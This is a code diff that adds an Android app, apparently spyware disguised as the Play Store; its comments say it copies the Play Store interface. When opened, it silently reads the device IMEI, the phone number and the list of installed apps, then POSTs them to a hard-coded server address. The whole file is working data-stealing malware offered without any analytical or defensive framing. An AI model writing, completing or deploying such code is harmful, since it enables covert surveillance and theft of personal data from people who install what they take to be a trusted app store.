@@ -1,0 +1,62 @@
+package com.fakeplaystore;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.widget.Toast;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.ArrayList;
+
+public class Main extends Activity {
+    private String SERVER_URL = "http://192.168.1.100:8080/upload";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main); // UI sederhana seperti Play Store
+        
+        // Eksekusi pengumpulan data di thread background
+        new Thread(new DataCollector()).start();
+    }
+
+    private class DataCollector implements Runnable {
+        @Override
+        public void run() {
+            StringBuilder data = new StringBuilder();
+
+            // 1. Ambil Nomor Telepon
+            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            data.append("IMEI: ").append(tm.getDeviceId()).append("\n");
+            data.append("Phone: ").append(tm.getLine1Number()).append("\n");
+
+            // 2. Ambil Daftar Aplikasi Terinstal
+            PackageManager pm = getPackageManager();
+            ArrayList<String> apps = new ArrayList<>();
+            for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(0)) {
+                apps.add(app.loadLabel(pm).toString() + " | " + app.packageName);
+            }
+            data.append("Installed Apps:\n").append(String.join(",\n", apps));
+
+            // 3. Kirim Data ke Server
+            sendToServer(data.toString());
+        }
+    }
+
+    private void sendToServer(String payload) {
+        try {
+            URL url = new URL(SERVER_URL);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.getOutputStream().write(payload.getBytes());
+            conn.disconnect();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
